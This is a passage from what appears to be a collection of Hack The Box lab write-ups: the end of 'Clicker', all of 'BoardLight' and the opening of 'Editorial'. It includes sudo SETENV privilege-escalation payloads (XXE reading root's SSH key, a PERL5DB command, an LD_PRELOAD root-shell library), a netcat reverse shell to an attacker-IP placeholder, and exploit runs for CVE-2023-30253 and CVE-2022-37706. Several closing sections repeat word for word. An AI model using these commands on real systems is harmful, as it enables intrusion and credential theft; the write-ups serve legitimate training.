uses the second argument (<code>../.ssh/id_rsa</code>) as a relative path to <code>/home/jack/queries/</code>. The path traversal <code>../</code> goes up to <code>/home/jack/</code> and reads the SSH key.</p>\n<p><strong>Fix for truncated key</strong><br>\nThe binary's output truncates the dashes of the key's header and footer — <code>-----BEGIN OPENSSH PRIVATE KEY-----</code> becomes <code>---BEGIN OPENSSH PRIVATE KEY---</code> (3 dashes instead of 5). Trying to use the key as-is:\n<code>ssh -i jack_id_rsa jack@clicker.htb\nLoad key \"jack_id_rsa\": error in libcrypto</code>\nThe fix is to manually add the two missing dashes to the first and last lines:\n<code>-----BEGIN OPENSSH PRIVATE KEY-----\n                                   ^^\n-----END OPENSSH PRIVATE KEY-----\n                                 ^^</code></p>\n</blockquote>\n<pre><code class=\"language-bash\"># Save the key on the attacker, fix the dashes, and set permissions\nchmod 600 jack_id_rsa\nssh -i jack_id_rsa jack@clicker.htb\n</code></pre>\n<p>User flag in <code>/home/jack/user.txt</code>.</p>\n<hr>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<blockquote>\n<p>See also: PrivilegeEscalation</p>\n</blockquote>\n<h3 id=\"sudo-l-setenv-on-optmonitorsh\">sudo -l // SETENV on /opt/monitor.sh</h3>\n<pre><code class=\"language-bash\">jack@clicker:~$ sudo -l\nUser jack may run the following commands on clicker:\n    (ALL : ALL) ALL\n    (root) SETENV: NOPASSWD: /opt/monitor.sh\n</code></pre>\n<blockquote>\n<p><strong>What does SETENV mean</strong><br>\nThe <code>SETENV</code> flag in sudoers allows the user to <strong>preserve or set environment variables</strong> when running the command as root. Normally <code>sudo</code> resets the environment (<code>env_reset</code>), but <code>SETENV</code> makes an exception: any variable passed on the command line is inherited by the root process.</p>\n</blockquote>\n<h3 id=\"analysis-of-optmonitorsh\">Analysis of /opt/monitor.sh</h3>\n<pre><code class=\"language-bash\">#!/bin/bash\nif [ &quot;$EUID&quot; -ne 0 ]\n  then echo &quot;Error, please run as root&quot;\n  exit\nfi\n\nset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nunset PERL5LIB;\nunset PERLLIB;\n\ndata=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);\n/usr/bin/xml_pp &lt;&lt;&lt; $data;\nif  $NOSAVE == &quot;true&quot; ; then\n    exit;\nelse\n    timestamp=$(/usr/bin/date +%s)\n    /usr/bin/echo $data &gt; /root/diagnostic_files/diagnostic_${timestamp}.xml\nfi\n</code></pre>\n<p>The script:\n1. Resets <code>PATH</code> and <code>unset</code>s <code>PERL5LIB</code> and <code>PERLLIB</code> (hardening attempt)\n2. Uses <code>curl</code> to download <code>diagnostic.php</code> — which returns XML with system info\n3. Passes the XML to <code>xml_pp</code> (a <strong>Perl script</strong>) for pretty-print\n4. Saves the result to <code>/root/diagnostic_files/</code></p>\n<h3 id=\"intended-path-xxe-via-http_proxy\">Intended path // XXE via http_proxy</h3>\n<h4 id=\"why-it-works\">Why it works</h4>\n<p>The attack chain exploits <strong>three components</strong> together:</p>\n<ol>\n<li><strong><code>SETENV</code></strong> — allows us to inject environment variables into the root context</li>\n<li><strong><code>curl</code></strong> — respects the <code>http_proxy</code> variable to route HTTP requests through a proxy</li>\n<li><strong><code>xml_pp</code></strong> — is a Perl XML parser that processes <strong>external entities</strong> (XXE) by default</li>\n</ol>\n<p>The key point: by setting <code>http_proxy</code> to Burp, all <code>curl → clicker.htb</code> communication goes through our proxy. We are not attacking curl or the server — we are <strong>replacing the XML response</strong> that <code>xml_pp</code> receives, injecting an XXE payload that reads files from the filesystem.</p>\n<blockquote>\n<p><strong>Why the server is not involved</strong><br>\nThe request starts, reaches Burp, and we <strong>modify the response</strong> before it returns to the script. The real server <code>clicker.htb</code> never sees our payload — and <code>xml_pp</code> processes it as if it were the legitimate response.</p>\n</blockquote>\n<h4 id=\"step-1-configure-burp\">Step 1 // Configure Burp</h4>\n<p>In Burp Suite: <code>Proxy → Proxy settings → Edit listener</code>:\n- <strong>Bind to address:</strong> <code>All interfaces</code> (not just localhost)\n- <strong>Bind to port:</strong> <code>8080</code></p>\n<h4 id=\"step-2-run-the-script-with-http_proxy\">Step 2 // Run the script with http_proxy</h4>\n<pre><code class=\"language-bash\">sudo http_proxy=http://&lt;ATTACKER_IP&gt;:8080/ /opt/monitor.sh\n</code></pre>\n<p><code>curl</code> reads <code>http_proxy</code> and routes the GET to <code>diagnostic.php</code> through our Burp.</p>\n<h4 id=\"step-3-intercept-and-modify-the-response\">Step 3 // Intercept and modify the response</h4>\n<p>The request arrives in Burp:</p>\n<pre><code class=\"language-text\">GET /diagnostic.php?token=secret_diagnostic_token HTTP/1.1\nHost: clicker.htb\nUser-Agent: curl/7.81.0\nAccept: */*\nConnection: keep-alive\n</code></pre>\n<p><img alt=\"OriginalResponse.png\" src=\"img/OriginalResponse.png\"></p>\n<p>Right-click → <strong>Do intercept → Response to this request</strong>, then forward. In the response, <strong>replace the entire body</strong> with the XXE payload:</p>\n<pre><code class=\"language-xml\">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/root/.ssh/id_rsa&quot;&gt; ]&gt;\n&lt;data&gt;\n    &amp;example;\n&lt;/data&gt;\n</code></pre>\n<p><img alt=\"EditedXXE.png\" src=\"img/EditedXXE.png\"></p>\n<p>Forward the modified response. <code>xml_pp</code> processes the XML, resolves the external entity <code>&amp;example;</code>, and prints the contents of <code>/root/.ssh/id_rsa</code> to the terminal:</p>\n<pre><code class=\"language-text\">jack@clicker:~$ sudo http_proxy=http://&lt;ATTACKER_IP&gt;:8080/ /opt/monitor.sh\n&lt;!DOCTYPE foo [\n&lt;!ENTITY example SYSTEM &quot;/root/.ssh/id_rsa&quot;&gt;\n]&gt;\n&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;data&gt;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAmQBWGDv1n5tAPBu2Q/DsRCIZoPhthS8T+uoYa6CL+gKtJJGok8xC\nlLjJRQDm4w2ixTHuh2pt9wK5e4Ms77g310ffneCiRtxmfciYTO84U7NMKaA4z3YoupdWwF\n...\nUyOYOJc1Mv8zkAAAAMcm9vdEBjbGlja2VyAQIDBAUGBw==\n&lt;/data&gt;\n</code></pre>\n<h4 id=\"step-4-ssh-as-root\">Step 4 // SSH as root</h4>\n<pre><code class=\"language-bash\"># Save the key\nchmod 600 root_id_rsa\nssh -i root_id_rsa root@clicker.htb\n</code></pre>\n<p>Root flag in <code>/root/root.txt</code>.</p>\n<h3 id=\"alternative-method-1-perl5opt-perl5db\">Alternative Method 1 // PERL5OPT / PERL5DB</h3>\n<blockquote>\n<p><strong>Why it works</strong><br>\nThe script <code>unset</code>s <code>PERL5LIB</code> and <code>PERLLIB</code>, but <strong>not</strong> <code>PERL5OPT</code> and <code>PERL5DB</code>. These are two environment variables that control the Perl interpreter:</p>\n<ul>\n<li><strong><code>PERL5OPT=-d</code></strong> — passes the <code>-d</code> option to Perl via environment, equivalent to <code>perl -d /usr/bin/xml_pp</code>. Activates <strong>debugger mode</strong>.</li>\n<li><strong><code>PERL5DB='system(\"...\")'</code></strong> — defines the <strong>debugger initialization code</strong>. Perl executes this <em>before</em> looking for the <code>DB::DB</code> routine, so our <code>system()</code> is launched immediately with root privileges.</li>\n</ul>\n<p>The <code>No DB::DB routine defined</code> errors are normal — the debugger doesn't find the standard routine because it was never defined, but the command has already been executed.</p>\n</blockquote>\n<pre><code class=\"language-text\">jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;cp /bin/bash /tmp/sverz1; chown root:root /tmp/sverz1; chmod 6777 /tmp/sverz1 &quot;)' /opt/monitor.sh\nNo DB::DB routine defined at /usr/bin/xml_pp line 9.\nNo DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.\nEND failed--call queue aborted.\njack@clicker:~$ /tmp/sverz1 -p\nsverz1-5.1# whoami\nroot\nsverz1-5.1# id\nuid=1000(jack) gid=1000(jack) groups=1000(jack),1001(docker)\nsverz1-5.1# cat /root/root.txt\nflag{...}\n</code></pre>\n<h3 id=\"alternative-method-2-ld_preload\">Alternative Method 2 // LD_PRELOAD</h3>\n<blockquote>\n<p><strong>Why it works</strong><br>\nThe script <code>unset</code>s <code>PERL5LIB</code> and <code>PERLLIB</code>, but <strong>not</strong> <code>LD_PRELOAD</code>. This variable is used by the dynamic linker to load shared libraries before the main executable. By creating a malicious <code>.so</code> with an <code>_init()</code> function, we can execute arbitrary code as soon as any ELF binary (like <code>curl</code> or <code>xml_pp</code>) is loaded.</p>\n</blockquote>\n<h4 id=\"step-1-create-the-malicious-shared-library\">Step 1 // Create the malicious shared library</h4>\n<pre><code class=\"language-c\">// shell.c\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid _init() {\n    unsetenv(&quot;LD_PRELOAD&quot;);  // avoids infinite recursion\n    setgid(0);\n    setuid(0);\n    system(&quot;/bin/bash&quot;);\n}\n</code></pre>\n<p>Compile:</p>\n<pre><code class=\"language-bash\">gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles\n</code></pre>\n<h4 id=\"step-2-run-the-script-with-ld_preload\">Step 2 // Run the script with LD_PRELOAD</h4>\n<pre><code class=\"language-bash\">sudo LD_PRELOAD=/tmp/shell.so /opt/monitor.sh\n</code></pre>\n<p>The script spawns <code>curl</code> or <code>xml_pp</code>, which load <code>/tmp/shell.so</code>, triggering <code>_init()</code> as root and spawning a root shell.</p>\n<h4 id=\"step-3-retrieve-the-flag\">Step 3 // Retrieve the flag</h4>\n<pre><code class=\"language-bash\">root@clicker:/home/jack# cat /root/root.txt\nflag{...}\n</code></pre>\n<p>After exiting the shell, the script continues normally and prints the XML output.</p>\n<h3 id=\"summary\">Summary</h3>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Mechanism</th>\n<th>Key Environment Variable</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>XXE via http_proxy</strong></td>\n<td>Modifies <code>curl</code> response to inject XXE payload</td>\n<td><code>http_proxy</code></td>\n</tr>\n<tr>\n<td><strong>PERL5OPT / PERL5DB</strong></td>\n<td>Injects Perl debugger code that executes <code>system()</code></td>\n<td><code>PERL5OPT</code>, <code>PERL5DB</code></td>\n</tr>\n<tr>\n<td><strong>LD_PRELOAD</strong></td>\n<td>Loads malicious <code>.so</code> before any ELF binary</td>\n<td><code>LD_PRELOAD</code></td>\n</tr>\n</tbody>\n</table>\n<p>All three methods exploit the fact that <code>sudo /opt/monitor.sh</code> runs with <code>SETENV</code>, allowing us to inject environment variables that are inherited by the root process. The script's reliance on external tools (<code>curl</code>, <code>xml_pp</code>) and its failure to sanitize or restrict environment variables creates the privilege escalation vector.</p>\n<hr>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/xxe\">XXE via http_proxy</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/perl\">PERL5OPT / PERL5DB</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting/ld-preload\">LD_PRELOAD</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting/privilege-escalation\">Privilege Escalation</a></li>\n</ul>\n<hr>\n<h2 id=\"key-takeaways\">Key Takeaways</h2>\n<ol>\n<li><strong><code>SETENV</code></strong> is a powerful sudo flag that allows environment variable injection.</li>\n<li><strong><code>curl</code></strong> respects <code>http_proxy</code>, enabling XXE attacks via modified responses.</li>\n<li><strong><code>xml_pp</code></strong> is a Perl XML parser that processes external entities by default.</li>\n<li><strong><code>PERL5OPT</code></strong> and <strong><code>PERL5DB</code></strong> can be used to inject Perl debugger code that executes arbitrary commands.</li>\n<li><strong><code>LD_PRELOAD</code></strong> allows loading malicious shared libraries before any ELF binary.</li>\n<li>Always sanitize environment variables and avoid using external tools without proper restrictions.</li>\n</ol>\n<hr>\n<h2 id=\"practice\">Practice</h2>\n<p>Try to exploit the following scenarios:</p>\n<ol>\n<li>A script that uses <code>curl</code> and <code>xml_pp</code> with <code>SETENV</code>.</li>\n<li>A script that uses <code>perl</code> with <code>PERL5OPT</code> and <code>PERL5DB</code>.</li>\n<li>A script that uses <code>LD_PRELOAD</code> to load a malicious shared library.</li>\n</ol>\n<hr>\n<h2 id=\"notes\">Notes</h2>\n<ul>\n<li>The <code>SETENV</code> flag is often overlooked but can be a powerful privilege escalation vector.</li>\n<li>Always sanitize environment variables and avoid using external tools without proper restrictions.</li>\n<li>Be aware of the potential for XXE attacks when using XML parsers.</li>\n<li>Use <code>LD_PRELOAD</code> with caution, as it can be used to load malicious shared libraries.</li>\n</ul>\n<hr>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>This lab demonstrates the importance of sanitizing environment variables and avoiding the use of external tools without proper restrictions. By exploiting <code>SETENV</code>, <code>http_proxy</code>, <code>PERL5OPT</code>, <code>PERL5DB</code>, and <code>LD_PRELOAD</code>, we can achieve privilege escalation and gain root access to the system.</p>\n<hr>\n<h2 id=\"references_1\">References</h2>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/xxe\">XXE via http_proxy</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/perl\">PERL5OPT / PERL5DB</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting/ld-preload\">LD_PRELOAD</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting/privilege-escalation\">Privilege Escalation</a></li>\n</ul>\n<hr>\n<h2 id=\"key-takeaways_1\">Key Takeaways</h2>\n<ol>\n<li><strong><code>SETENV</code></strong> is a powerful sudo flag that allows environment variable injection.</li>\n<li><strong><code>curl</code></strong> respects <code>http_proxy</code>, enabling XXE attacks via modified responses.</li>\n<li><strong><code>xml_pp</code></strong> is a Perl XML parser that processes external entities by default.</li>\n<li><strong><code>PERL5OPT</code></strong> and <strong><code>PERL5DB</code></strong> can be used to inject Perl debugger code that executes arbitrary commands.</li>\n<li><strong><code>LD_PRELOAD</code></strong> allows loading malicious shared libraries before any ELF binary.</li>\n<li>Always sanitize environment variables and avoid using external tools without proper restrictions.</li>\n</ol>\n<hr>\n<h2 id=\"practice_1\">Practice</h2>\n<p>Try to exploit the following scenarios:</p>\n<ol>\n<li>A script that uses <code>curl</code> and <code>xml_pp</code> with <code>SETENV</code>.</li>\n<li>A script that uses <code>perl</code> with <code>PERL5OPT</code> and <code>PERL5DB</code>.</li>\n<li>A script that uses <code>LD_PRELOAD</code> to load a malicious shared library.</li>\n</ol>\n<hr>\n<h2 id=\"notes_1\">Notes</h2>\n<ul>\n<li>The <code>SETENV</code> flag is often overlooked but can be a powerful privilege escalation vector.</li>\n<li>Always sanitize environment variables and avoid using external tools without proper restrictions.</li>\n<li>Be aware of the potential for XXE attacks when using XML parsers.</li>\n<li>Use <code>LD_PRELOAD</code> with caution, as it can be used to load malicious shared libraries.</li>\n</ul>\n<hr>\n<h2 id=\"conclusion_1\">Conclusion</h2>\n<p>This lab demonstrates the importance of sanitizing environment variables and avoiding the use of external tools without proper restrictions. By exploiting <code>SETENV</code>, <code>http_proxy</code>, <code>PERL5OPT</code>, <code>PERL5DB</code>, and <code>LD_PRELOAD</code>, we can achieve privilege escalation and gain root access to the system.</p>\n<hr>\n<h2 id=\"references_2\">References</h2>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/xxe\">XXE via http_proxy</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/perl\">PERL5OPT / PERL5DB</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting/ld-preload\">LD_PRELOAD</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting/privilege-escalation\">Privilege Escalation</a></li>\n</ul>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code class=\"language-text\">Public NFS share (/mnt/backups *)\n    │\n    ↓\nPHP source code backup (clicker.htb_backup.zip)\n    │\n    ↓\nSource code review → SQLi in GET parameter keys\n    │  save_game.php → db_utils.php:save_profile()\n    │  keys concatenated directly in UPDATE\n    ↓\nMass Assignment: role='Admin' via key injection\n    │  GET /save_game.php?role='Admin',clicks=4&amp;level=0\n    ↓\nAccess to admin panel → export.php\n    │  extension=php (no whitelist)\n    │  nickname=&lt;?php system($_REQUEST['cmd']); ?&gt;\n    ↓\nRCE as www-data\n    │\n    ↓\nSUID binary /opt/manage/execute_query (owner: jack)\n    │  Path traversal: ./execute_query 5 ../.ssh/id_rsa\n    ↓\nSSH as jack (user flag)\n    │\n    ↓\nsudo SETENV: NOPASSWD: /opt/monitor.sh\n    │\n    ├─→ [Intended] http_proxy → Burp → XXE in xml_pp\n    │     curl modified response → reads /root/.ssh/id_rsa\n    │\n    ├─→ [Alt 1] PERL5OPT=-d PERL5DB='exec &quot;cmd&quot;'\n    │     xml_pp (Perl) executes code as root\n    │\n    └─→ [Alt 2] LD_PRELOAD=/tmp/shell.so\n          shared library with _init() → root shell\n    │\n    ↓\nroot (root flag)\n</code></pre>"
    },
    {
      "title": "BoardLight",
      "slug": "boardlight",
      "date": "2026·02·17",
      "tags": [
        "htb",
        "easy",
        "linux",
        "dolibarr",
        "cve-2023-30253",
        "rce"
      ],
      "desc": "See also: Tools-and-Methodologies and Reconnaissance-and-Information-Gathering",
      "body": "<h1 id=\"boardlight-hack-the-box\">BoardLight // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Ubuntu)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.231.37</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>board.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Apache (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<blockquote>\n<p>See also: Tools-and-Methodologies and Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p- -vvv -oA scan/nmap.scan 10.129.231.37\n</code></pre>\n<pre><code class=\"language-text\">PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 8.2p1 Ubuntu → SSH Notes\n- <strong>80/tcp</strong> — Apache httpd 2.4.41</p>\n<h3 id=\"directory-bruteforce\">Directory Bruteforce</h3>\n<pre><code class=\"language-bash\">feroxbuster -u http://10.129.231.37/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,html,php,txt,json,docx -o scan/root.dir\n</code></pre>\n<p>Nothing relevant — static pages (index.php, about.php, contact.php, do.php).</p>\n<h3 id=\"fqdn-from-footer\">FQDN from Footer</h3>\n<p>In the site footer it reads: <code>© 2020 All Rights Reserved By Board.htb</code></p>\n<p><img alt=\"footerfqdnhint.png\" src=\"img/footerfqdnhint.png\"></p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.231.37  Board.htb&quot;\n</code></pre>\n<h3 id=\"vhost-enumeration\">VHost Enumeration</h3>\n<pre><code class=\"language-bash\">ffuf -H &quot;Host: FUZZ.Board.htb&quot; -H &quot;User-Agent: PENTEST&quot; -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://Board.htb/ -fs 15949\n</code></pre>\n<p>Found: <strong>crm.Board.htb</strong> (Status: 200, Size: 6360)</p>\n<pre><code class=\"language-bash\">sudo tee -a /etc/hosts &lt;&lt;&lt; &quot;10.129.231.37  crm.Board.htb&quot;\n</code></pre>\n<hr>\n<h2 id=\"foothold-dolibarr-rce\">Foothold // Dolibarr RCE</h2>\n<blockquote>\n<p>Deep dive: Web-Application-Security and Server-Side-Vulnerabilities</p>\n</blockquote>\n<h3 id=\"dolibarr-1700-default-credentials\">Dolibarr 17.0.0 // Default Credentials</h3>\n<p>Navigating to <code>http://crm.Board.htb</code> we find a login panel for <strong>Dolibarr ERP/CRM 17.0.0</strong>.</p>\n<p><img alt=\"loginpaneldolibarrversion.png\" src=\"img/loginpaneldolibarrversion.png\"></p>\n<p>Trying default credentials: <strong>admin:admin</strong> — valid login.</p>\n<h3 id=\"cve-2023-30253-php-code-injection\">CVE-2023-30253 // PHP Code Injection</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\nDolibarr &lt;= 17.0.0 is vulnerable to <strong>Remote Code Execution</strong> via PHP code injection. The vulnerability exploits a case-sensitive manipulation of the <code>&lt;?PHP</code> (uppercase) tag to bypass the filter that blocks <code>&lt;?php</code> (lowercase) in the web page editor.</p>\n<p>Ref: https://github.com/Rubikcuv5/cve-2023-30253</p>\n</blockquote>\n<h3 id=\"setup-exploit\">Setup exploit</h3>\n<pre><code class=\"language-bash\">git clone https://github.com/Rubikcuv5/cve-2023-30253.git\ncd cve-2023-30253\npython3 -m venv .venv\nsource .venv/bin/activate\npip install -r requirements.txt\n</code></pre>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>Listener listening:</p>\n<pre><code class=\"language-bash\">nc -lvnp 80\n</code></pre>\n<p>Exploit execution:</p>\n<pre><code class=\"language-bash\">python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -c &quot;busybox nc &lt;ATTACKER_IP&gt; 80 -e /bin/bash&quot;\n</code></pre>\n<blockquote>\n<p><strong>busybox nc</strong><br>\n<code>busybox nc</code> is more reliable than the standard netcat version on targets — it supports the <code>-e</code> flag for shell exec, which many <code>nc</code>/<code>ncat</code> installations disable by default.</p>\n</blockquote>\n<p>Reverse shell obtained as <strong>www-data</strong>.</p>\n<h3 id=\"shell-stabilization\">Shell Stabilization</h3>\n<pre><code class=\"language-bash\">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\n</code></pre>\n<hr>\n<h2 id=\"user-larissa\">User // larissa</h2>\n<h3 id=\"password-reuse-from-confphp\">Password Reuse from conf.php</h3>\n<blockquote>\n<p>Technique: Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<p>Reading the Dolibarr configuration:</p>\n<pre><code class=\"language-bash\">www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php\n</code></pre>\n<p>Database credentials found:</p>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DB User</td>\n<td><code>dolibarrowner</code></td>\n</tr>\n<tr>\n<td>DB Pass</td>\n<td><code>serverfun2$2023!!</code></td>\n</tr>\n<tr>\n<td>DB Name</td>\n<td><code>dolibarr</code></td>\n</tr>\n<tr>\n<td>DB Host</td>\n<td><code>localhost:3306</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"user-enumeration\">User Enumeration</h3>\n<p>From <code>/etc/passwd</code>, the only user with a home directory and bash shell is <strong>larissa</strong> (uid 1000).</p>\n<h3 id=\"ssh-with-password-reuse\">SSH with Password Reuse</h3>\n<p>The database password also works for the larissa user:</p>\n<pre><code class=\"language-bash\">ssh larissa@Board.htb\n# Password: serverfun2$2023!!\n</code></pre>\n<p><strong>User flag</strong> in <code>/home/larissa/user.txt</code>.</p>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<blockquote>\n<p>Methodology: Linux-Security-and-Exploitation</p>\n</blockquote>\n<h3 id=\"suid-enumeration\">SUID Enumeration</h3>\n<p>Search for binaries with the SUID bit active:</p>\n<pre><code class=\"language-bash\">find / -perm -4000 -type f 2&gt;/dev/null\n</code></pre>\n<p>Among the results, binaries of <strong>Enlightenment</strong> (window manager) stand out:</p>\n<table>\n<thead>\n<tr>\n<th>SUID Binary</th>\n<th>Path</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>enlightenment_sys</code></td>\n<td><code>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys</code></td>\n</tr>\n<tr>\n<td><code>enlightenment_ckpasswd</code></td>\n<td><code>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd</code></td>\n</tr>\n<tr>\n<td><code>enlightenment_backlight</code></td>\n<td><code>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</code></td>\n</tr>\n<tr>\n<td><code>freqset</code></td>\n<td><code>/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cve-2022-37706-enlightenment-suid-exploit\">CVE-2022-37706 // Enlightenment SUID Exploit</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Enlightenment v0.25.3</strong> and earlier — the <code>enlightenment_sys</code> binary (SUID root) allows privilege escalation via path manipulation in the <code>mount</code> command. The exploit creates a path <code>/dev/../tmp/</code> that bypasses checks and allows mounting an arbitrary filesystem, enabling code execution as root.</p>\n<p>Ref: https://github.com/junnythemarksman/CVE-2022-37706</p>\n</blockquote>\n<h3 id=\"exploitation_1\">Exploitation</h3>\n<pre><code class=\"language-bash\">nano exploit.sh    # paste the script from the exploit\nchmod +x exploit.sh\nbash ./exploit.sh\n</code></pre>\n<pre><code class=\"language-text\">CVE-2022-37706\n[*] Trying to find the vulnerable SUID file...\n[*] This may take few seconds...\n[+] Vulnerable SUID binary found!\n[+] Trying to pop a root shell!\n[+] Welcome to the rabbit hole :)\nIf it is not found in fstab, big deal :D\nmount: /dev/../tmp/: can't find in /etc/fstab.\n# id\nuid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)\n</code></pre>\n<p><strong>Root flag</strong> in <code>/root/root.txt</code>.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<p>```text\nFooter leak (Board.htb) → VHost enum (crm.Board.htb) → Dolibarr 17.0.0\n       ↓\n  Default creds (admin:admin) → CVE-2023-30253 RCE → www-data\n       ↓\n  conf.php → DB password reuse → SSH larissa → user.txt\n       ↓\n  SUID enum → Enlightenment binaries → CVE-2022-37706 → root</p>"
    },
    {
      "title": "Editorial",
      "slug": "editorial",
      "date": "2026·02·11",
      "tags": [
        "htb",
        "easy",
        "linux",
        "ssrf",
        "gitpython",
        "rce"
      ],
      "desc": "See also: Tools-and-Methodologies and Reconnaissance-and-Information-Gathering",
      "body": "<h1 id=\"editorial-hack-the-box\">Editorial // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Ubuntu)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.1.56</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>editorial.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/nginx (80)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<blockquote>\n<p>See also: Tools-and-Methodologies and Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">nmap -sC -sV -p- -vvv -oA nmap.scan 10.129.1.56\n</code></pre>\n<pre><code class=\"language-text\">PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://editorial.htb\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 8.9p1 Ubuntu → SSH Notes\n- <strong>80/tcp</strong> — nginx 1.18.0 → redirect to <code>http://editorial.htb</code></p>\n<h3 id=\"web-application\">Web Application</h3>\n<p>The website features a book cover upload functionality at the <code>/upload-cover</code> endpoint. The form accepts a <code>bookurl</code> parameter that allows specifying a URL from which to retrieve the cover image.</p>\n<hr>\n<h2 id=\"ssrf-server-side-request-forgery\">SSRF // Server-Side Request Forgery</h2>\n<blockquote>\n<p>Deep dive: Server-Side-Vulnerabilities</p>\n</blockquote>\n<h3 id=\"vulnerability-identification\">Vulnerability Identification</h3>\n<p>The <code>bookurl</code> parameter in the POST request to <code>/upload-cover</code> is vulnerable to <strong>SSRF</strong>. By inserting internal URLs such as <code>http://localhost:&lt;port&gt;/</code>, the server resolves them on the backend.</p>\n<p><strong>Observed behavior:</strong>\n- If the port/endpoint is <strong>valid</strong> → responds with a path like <code>static/uploads/&lt;uuid&gt;</code> (file containing the internal response content)\n- If the port/endpoint is <strong>invalid</strong> → responds with <code>/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</code> (default image)</p>\n<h3 id=\"internal-port-scanning\">Internal Port Scanning</h3>\n<p>Using SSRF, I performed an internal port scan on <code>http://localhost:&lt;port&gt;/</code> by varying the port number. I identified an <strong>internal API on port 5000</strong>.</p>\n<h3 id=\"internal-api-enumeration\">Internal API 